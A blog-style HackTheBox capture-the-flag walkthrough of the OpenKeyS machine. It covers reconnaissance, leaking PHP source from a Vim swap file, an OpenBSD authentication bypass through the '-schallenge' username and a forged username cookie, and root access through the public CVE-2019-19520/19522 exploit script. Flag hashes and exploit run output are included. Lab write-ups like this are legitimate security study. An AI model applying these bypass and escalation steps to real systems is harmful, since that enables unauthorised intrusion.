---
layout: post
title:  "HackTheBox OpenKeyS Writeup"
tags: hackthebox openbsd authentication-bypass
categories: hackthebox active-machine
rel-img: /assets/img/htb/openkeys/OpenKeyS.png
description: Exploit OpenBSD vulnerabilities to conquer the machine!!
---

### Hackthebox OpenKeyS Writeup
![OpenKeyS](/assets/img/htb/openkeys/OpenKeyS.png)

## Abstract

Expoit OpenBSD vulnerabilities to conquer the machine!!

## Summary
1. Initial foothold
  - Nmap recon
  - Gobuster directory scan
2. OpenBSD Authentication Bypass
3. User Flag
5. OpenBSD authroot Priviledge Escalation
6. Root Flag

## Initial foothold

### Nmap recon

```
# Nmap 7.80 scan initiated Sun Jul 26 10:13:48 2020 as: nmap -sC -sV -oN nmap 10.10.10.199
Nmap scan report for 10.10.10.199
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 26 10:14:36 2020 -- 1 IP address (1 host up) scanned in 48.51 seconds

```
Only 2 port are open , go into brower and you will see login page at `index.php`

![Index page](/assets/img/htb/openkeys/index.png)

### Gobuster directory scan

```
root@kali:~# gobuster dir -u 10.10.10.199 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 100

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/07/26 20:36:24 Starting gobuster
===============================================================
/index.php (Status: 200)
/images (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/fonts (Status: 301)
```

I found a .swp file on /includes page

![.swp file](/assets/img/htb/openkeys/swp.png)

lets download the file using wget and try to read its content
using `file` command on the swp file, leaks the username jennifer, the hostname openkeys.htb> and the filepath /var/www/htdocs/includes/auth.php
```
root@kali:~# file auth.php.swp
auth.php.swp: Vim swap file, version 8.1, pid 49850, user jennifer, host openkeys.htb, file /var/www/htdocs/includes/auth.php
```
looking through the output of strings on the swp file, I realized that the lines were printed in reverse order so I used `tac` to correct the order of lines.

```
root@kali:~# strings auth.php.swp | tac > auth.php
```

we got the php code used

```
<?php
function authenticate($username, $password)
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
    system($cmd, $retcode);
    return $retcode;
function is_active_session()
    // Session timeout in seconds
    $session_timeout = 300;
    // Start the session
    session_start();
    // Is the user logged in? 
    if(isset($_SESSION["logged_in"]))
    {
        // Has the session expired?
        $time = $_SERVER['REQUEST_TIME'];
        if (isset($_SESSION['last_activity']) && 
            ($time - $_SESSION['last_activity']) > $session_timeout)
        {
            close_session();
            return False;
        }
        else
        {
            // Session is active, update last activity time and return True
            $_SESSION['last_activity'] = $time;
            return True;
        }
    }
    else
    {
        return False;
    }
function init_session()
    $_SESSION["logged_in"] = True;
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["username"] = $_REQUEST['username'];
function close_session()
    session_unset();
    session_destroy();
    session_start();
?>
```
#### check_auth binary

The authenticate function uses `check_auth` binary from auth_helpers directory, that we can access from the webserver. However analysing file didn't reveal anything useful.

## OpenBSD Authentication Bypass

So I googled `openbsd auth exploit` and found this amazing blog post, it explains 3 Local privEsc and an authentication bypass vulnerability in OpenBSD

> [OpenBSD Authentication ByPass and Local Priviledge escalation vulnerabilities](https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/)

### Exploiting Authentication bypass

according to the blog, using `-schallenge` as username gives successful login with any arbitrary password. Anyway i got login error. 

from the Vim Swap file, we know that user jennifer exists, so we can trick the server by creating a username cookie with jennifer as value. FInally i got jennifer ssh priv key.

## User flag
	
```
root@kali:~# ssh -i jennifer.key jennifer@10.10.10.199
Last login: Tue Jul 28 08:52:43 2020 from 10.10.14.53
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$ id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
openkeys$ ls
user.txt
openkeys$ cat user.txt                                                                                                                                                                                            
36ab21239a15c537bde90626891d2b10
```
## OpenBSD authroot Priviledge Esclation

We use 2 of the privilege escalation vulnerabilities, we saw in the blogpost
CVE-2019-19520 allows us to gain access to the auth user group via xlock which is used by CVE-2019-19522 to gain root access
I found this nice bash script on github that does all this for us

> [OpenBSD authroot](https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot)

## Root flag

Transfer the exploit using scp	
```
root@kali:~# scp -i jennifer.key ./privEsc.sh jennifer@10.10.10.199:/tmp
privEsc.sh                    100% 4087    13.7KB/s   00:00
```

when prompted, put EGG LARD GROW HOG DRAG LAIN as password
	
```
openkeys$ ./privEsc.sh 
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:

openkeys# id                                                                                            
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
openkeys# ls -al
total 52
drwx------   4 root  wheel   512 Jun 24 01:30 .
drwxr-xr-x  13 root  wheel   512 Jul 28 09:17 ..
-rw-r--r--   1 root  wheel    87 Oct 12  2019 .Xdefaults
drwxr-xr-x   3 root  wheel   512 Jan 11  2020 .composer
-rw-r--r--   1 root  wheel   578 Oct 12  2019 .cshrc
-rw-r--r--   1 root  wheel    94 Oct 12  2019 .cvsrc
-rw-r--r--   1 root  wheel    10 Jan 11  2020 .forward
-rw-r--r--   1 root  wheel   328 Oct 12  2019 .login
-rw-r--r--   1 root  wheel   468 Oct 12  2019 .profile
drwx------   2 root  wheel   512 Jan 11  2020 .ssh
-rw-------   1 root  wheel  1362 Jun 23 12:35 .viminfo
-rw-r--r--   1 root  wheel   381 Jul 25 20:54 dead.letter
-r--------   1 root  wheel    33 Jan 12  2020 root.txt
openkeys# cat root.txt                                                                                  
f3a553b1697050ae885e7c02dbfc6efa
```
and we got the root shell
